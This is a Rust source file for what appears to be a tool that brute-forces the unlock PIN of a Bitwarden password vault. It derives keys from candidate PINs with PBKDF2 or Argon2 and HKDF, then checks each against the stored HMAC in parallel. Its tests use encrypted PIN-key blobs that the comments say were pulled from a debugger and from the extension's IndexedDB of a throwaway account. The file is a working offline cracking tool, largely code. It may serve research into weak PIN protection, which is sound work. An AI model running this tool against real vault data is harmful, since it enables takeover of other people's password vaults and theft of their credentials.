use argon2::Argon2;
use base64::prelude::*;
use base64::Engine;
use hkdf::Hkdf;
use hmac::{Hmac, Mac};
use indicatif::ParallelProgressIterator;
use indicatif::ProgressStyle;
use pbkdf2::{password_hash::PasswordHasher, Pbkdf2};
use rayon::prelude::*;
use sha2::{Digest, Sha256};

pub mod cli;
pub mod log;
pub use cli::KDFConfig;

pub fn password_hash(kdf_config: KDFConfig, password: &[u8], salt: &[u8]) -> [u8; 32] {
    match kdf_config {
        KDFConfig::Pbkdf2 { iterations } => {
            let salt = pbkdf2::password_hash::SaltString::b64_encode(salt).unwrap();

            Pbkdf2
                .hash_password_customized(
                    password,
                    None,
                    None,
                    pbkdf2::Params {
                        rounds: iterations,
                        output_length: 32,
                    },
                    &salt,
                )
                .unwrap()
                .hash
                .unwrap()
                .as_bytes()
                .try_into()
                .unwrap()
        }
        KDFConfig::Argon2 {
            memory,
            iterations,
            parallelism,
        } => {
            let mut hasher = Sha256::new();
            hasher.update(salt);
            let salt = hasher.finalize();

            let mut password_hash = [0; 32];
            Argon2::new(
                argon2::Algorithm::default(),
                argon2::Version::default(),
                argon2::Params::new(memory * 1024, iterations, parallelism, Some(32)).unwrap(),
            )
            .hash_password_into(password, &salt, &mut password_hash)
            .unwrap();
            password_hash
        }
    }
}

pub fn parse_encrypted(encrypted: &str) -> (Vec<u8>, Vec<u8>) {
    let mut split = encrypted.split('.');
    split.next();
    let data = split.next().unwrap();

    let mut split = data.split('|');
    let iv = BASE64_STANDARD.decode(split.next().unwrap()).unwrap();
    let ciphertext = BASE64_STANDARD.decode(split.next().unwrap()).unwrap();
    let mac = BASE64_STANDARD.decode(split.next().unwrap()).unwrap();

    let mut data = Vec::with_capacity(iv.len() + ciphertext.len());
    data.extend(iv);
    data.extend(ciphertext);

    (data, mac)
}

pub fn stretch_key(password_hash: &[u8]) -> [u8; 32] {
    let hkdf = Hkdf::<Sha256>::from_prk(password_hash).unwrap();
    let mut mac_key = [0; 32];
    hkdf.expand(b"mac", &mut mac_key).unwrap();
    mac_key
}

pub fn mac_verify(mac_key: &[u8], data: &[u8], mac: &[u8]) -> bool {
    let mut mac_verify = Hmac::<Sha256>::new_from_slice(mac_key).unwrap();
    mac_verify.update(data);
    mac_verify.verify_slice(mac).is_ok()
}

pub fn brute_force_pin(
    encrypted: &str,
    email: &str,
    kdf_config: KDFConfig,
    pins: impl Iterator<Item = String> + Send,
    progress_max: Option<usize>,
) -> Option<String> {
    let (data, mac) = parse_encrypted(encrypted);

    let find = |pin: &String| {
        let password_hash = password_hash(kdf_config, pin.as_bytes(), email.as_bytes());
        let mac_key = stretch_key(&password_hash);

        mac_verify(&mac_key, &data, &mac)
    };

    if let Some(max) = progress_max {
        pins.par_bridge()
            .progress_count(max as u64)
            .with_message("Cracking...")
            .with_style(
                ProgressStyle::default_bar()
                    .template("[{bar:.cyan/blue}] {pos:>7}/{len:7} - {msg} ({elapsed} + ETA {eta}, {per_sec})")
                    .unwrap(),
            )
            .find_any(find)
    } else {
        pins.par_bridge().find_any(find)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    // Test data was generated using a real Bitwarden account from https://temp-mail.org/en/

    const EMAIL: &str = "tenire3448@fashlend.com";

    #[test]
    fn memory_pbkdf2_600000() {
        // `settings.pinKeyEncryptedUserKeyEphemeral` taken from debugger
        let encrypted = "2.P6TpPPpMf5zkHUfTplnocw==|KZ7/pR8ft+LwcjfXs2ym9hmxE7DLIeA9Kl+IPwTVCwLmbpkFtYKPWvK53DEDDrVUeYvz/rPcl3MEH3wXl200HCsV5ZbGLGVU4bha5Aw20fk=|+Y46Za3Oo63XRbvqLFz5cVuvbqMvBqopD16+8HV83mk=";
        let kdf_config = KDFConfig::Pbkdf2 { iterations: 600000 };

        // small range to speed up tests
        let pins = (1330..1340).map(|pin| format!("{pin:04}"));

        assert_eq!(
            brute_force_pin(encrypted, EMAIL, kdf_config, pins, None),
            Some("1337".to_string())
        );
    }

    #[test]
    fn disk_pbkdf2_600000() {
        // `settings.pinKeyEncryptedUserKey` taken from extension indexdb
        let encrypted = "2.AVcSzI6mgEA9a2oKtV9WOw==|mSLNpc7qoZFnwnoGnL08N1eDiauYM5VRnr0QSZ134cjR6xgVYD7JjAkmsXDmVNP6lL1lB2fOq7uFTynIqNdA41ZUCj6KoceIz4edGrLi8TY=|UgXNesoPaz0gup17dfw6pqQsab8rtAHb6MvFDrrjSAY=";
        let kdf_config = KDFConfig::Pbkdf2 { iterations: 600000 };

        let pins = (1330..1340).map(|pin| format!("{pin:04}"));

        assert_eq!(
            brute_force_pin(encrypted, EMAIL, kdf_config, pins, None),
            Some("1337".to_string())
        );
    }

    #[test]
    fn memory_argon2_64_3_4() {
        // Changed KDF algorithm to `Argon2id` at https://vault.bitwarden.com/#/settings/security/security-keys
        let encrypted = "2.GcLsRNPIwGWG+Q7X+KspXw==|tgn2oSFE6uXzlJzJ6rFBfqmlMjVaFVTe/weQRwBXF+BLlh8g5aE7VTw4yd5H3+j4f+YMGMiVTsHmphHdwrbKifmjkxcf35KPYJ93O6Zp4T0=|Im0X4t25NP+lf3oFo1Dp2ag1pc3eQwrRuEu9a5ecvVM=";
        let kdf_config = KDFConfig::Argon2 {
            memory: 64,
            iterations: 3,
            parallelism: 4,
        };

        let pins = (1330..1340).map(|pin| format!("{pin:04}"));

        assert_eq!(
            brute_force_pin(encrypted, EMAIL, kdf_config, pins, None),
            Some("1337".to_string())
        );
    }

    #[test]
    fn disk_argon2_64_3_4() {
        let encrypted = "2.FA4aPsq/5jKajc8tGqYKaQ==|CO/t9f1EQ4O5LL6O1anBAd1/4Hb+l4I32UMlW+3O7CoxTRXlEuLK5xvDCFmeRCYmylt206B22roFXycaRG3Z9fnN1aVVbBJ59qfCDEGusHw=|vmWmAb9kfqPPljRNhDMe+fDlwwat8XN5BZSsMAH8p8w=";
        let kdf_config = KDFConfig::Argon2 {
            memory: 64,
            iterations: 3,
            parallelism: 4,
        };

        let pins = (1330..1340).map(|pin| format!("{pin:04}"));

        assert_eq!(
            brute_force_pin(encrypted, EMAIL, kdf_config, pins, None),
            Some("1337".to_string())
        );
    }
}
